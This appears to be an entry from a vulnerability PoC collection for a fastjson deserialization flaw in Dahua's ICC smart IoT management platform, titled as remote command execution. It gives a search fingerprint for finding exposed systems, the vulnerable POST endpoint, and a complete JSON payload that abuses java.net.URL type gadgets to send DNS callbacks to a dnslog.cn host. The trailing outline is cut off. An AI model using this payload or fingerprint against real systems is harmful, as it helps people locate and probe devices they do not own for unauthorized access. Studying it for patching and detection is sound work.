# 大华智能物联综合管理平台(ICC)randomfastjson远程命令执行

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="*客户端会小于800*"`
- **请求**：`POST /evo-runs/v1.0/auths/sysusers/random HTTP/2`

**请求体 / payload**
```
poc：前往dnslog获取一个地址替换下列poc中的地址发起请求
Host: xx.xx.xx.xx
Content-Length: 372
Content-Type: application/json;charset=utf-8
{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}}""},"b":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}],"e":Set{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"},}

dns收到响应\
```

**其他**
- 大华智能物联综合管理平台(ICC)random fastjson远程命令执行: * [一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智能物联综合管理平台(ICC)